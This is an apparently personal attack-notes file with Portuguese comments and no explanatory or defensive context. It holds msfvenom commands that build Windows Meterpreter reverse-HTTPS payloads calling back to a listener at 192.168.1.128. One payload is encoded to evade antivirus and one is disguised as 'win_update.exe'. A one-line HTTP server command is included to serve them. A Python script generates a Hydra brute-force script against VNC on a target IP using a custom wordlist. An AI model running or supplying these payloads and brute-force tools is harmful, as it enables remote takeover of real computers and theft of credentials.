msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

# Código foi reiniciado, recriando o script Python para brute force automatizado VNC

import subprocess

ip_alvo = "192.168.1.84"  # Altere para o IP alvo
wordlist_path = "/mnt/data/wordlist_atibaia.txt"

script_content = f"""
import subprocess

ip_alvo = "{ip_alvo}"
wordlist_path = "{wordlist_path}"

print(f"Iniciando brute force VNC contra {{ip_alvo}}...\\n")

comando = [
    "hydra",
    "-P", wordlist_path,
    "-t", "4",
    "-f",
    "-V",
    ip_alvo,
    "vnc"
]

resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

if "login:" in resultado.stdout or "host:" in resultado.stdout:
    print("\\n====> POSSÍVEL SENHA ENCONTRADA! Resultado:")
    print(resultado.stdout)
else:
    print("Nenhuma senha encontrada ou tentativa falhou.")

print("Brute force VNC concluído.")
"""

with open("/mnt/data/bruteforce_vnc.py", "w") as f:
    f.write(script_content)

print("Script Python para brute force VNC criado como 'bruteforce_vnc.py'.")




